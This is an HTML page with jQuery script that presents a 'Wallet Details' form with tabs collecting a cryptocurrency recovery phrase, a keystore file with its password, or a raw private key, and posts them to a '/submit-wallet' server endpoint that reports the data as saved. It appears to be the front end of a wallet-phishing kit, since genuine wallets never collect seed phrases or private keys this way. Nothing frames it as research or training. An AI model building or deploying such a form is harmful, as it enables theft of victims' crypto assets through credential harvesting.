<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Form</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
<div class="container mt-5">
    <h3 class="text-center">Wallet Details</h3>
    <ul class="nav nav-tabs " id="walletTabs" role="tablist">
        <li class="nav-item" role="presentation">
            <button class="nav-link active" id="phrase-tab" data-bs-toggle="tab" data-bs-target="#phrase-tab-pane" type="button" role="tab">Phrase</button>
        </li>
        <li class="nav-item" role="presentation">
            <button class="nav-link" id="keystore-tab" data-bs-toggle="tab" data-bs-target="#keystore-tab-pane" type="button" role="tab">Keystore</button>
        </li>
        <li class="nav-item" role="presentation">
            <button class="nav-link" id="privatekey-tab" data-bs-toggle="tab" data-bs-target="#privatekey-tab-pane" type="button" role="tab">Private Key</button>
        </li>
    </ul>
    <form id="walletForm" class="tab-content mt-3">
        <!-- Phrase Tab -->
        <div class="tab-pane fade show active" id="phrase-tab-pane" role="tabpanel">
            <div class="mb-3">
                <label for="phrase" class="form-label">Recovery Phrase</label>
                <textarea name="phrase" id="phrase" class="form-control" rows="3" placeholder="Enter your recovery phrase (e.g., 12 or 24 words)" required></textarea>
            </div>
            <input type="hidden" name="type" value="phrase">
        </div>
        <!-- Keystore Tab -->
        <div class="tab-pane fade" id="keystore-tab-pane" role="tabpanel">
            <div class="mb-3">
                <label for="keystore" class="form-label">Keystore</label>
                <textarea name="keystore" id="keystore" class="form-control" rows="3" placeholder="Paste your keystore data" required></textarea>
            </div>
            <div class="mb-3">
                <label for="password" class="form-label">Password</label>
                <input type="password" name="password" id="password" class="form-control" placeholder="Enter your keystore password" required>
            </div>
            <input type="hidden" name="type" value="keystore">
        </div>
        <!-- Private Key Tab -->
        <div class="tab-pane fade" id="privatekey-tab-pane" role="tabpanel">
            <div class="mb-3">
                <label for="privatekey" class="form-label">Private Key</label>
                <input type="text" name="privatekey" id="privatekey" class="form-control" placeholder="Enter your private key" required>
            </div>
            <input type="hidden" name="type" value="privatekey">
        </div>
        <button type="submit" class="btn btn-primary">Submit</button>
    </form>
</div>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>    


<script>

    $(document).ready(function () {
        // Handle form submission
        $("#walletForm").on("submit", function (e) {
            e.preventDefault();

            const formData = new FormData(this);

            // Client-side validation
            let isValid = true;
            if (formData.get("type") === "phrase" && !formData.get("phrase").trim()) {
                alert(`Please enter your recovery phrase. ${formData.get("type")}`);
                isValid = false;
            } else if (formData.get("type") === "keystore" &&
                (!formData.get("keystore").trim() || !formData.get("password").trim())) {
                alert("Please provide keystore data and password.");
                isValid = false;
            } else if (formData.get("type") === "privatekey" && !formData.get("privatekey").trim()) {
                alert("Please enter your private key.");
                isValid = false;
            }

            if (!isValid) return;

            // AJAX request to Flask endpoint
            $.ajax({
                url: "/submit-wallet",
                type: "POST",
                data: formData,
                contentType: false,
                processData: false,
                success: function (response) {
                    console.log(response);
                    alert("Wallet data saved successfully!");
                },
                error: function () {
                    alert("An error occurred. Please try again.");
                }
            });
        });
    });
</script>
</body>
</html>
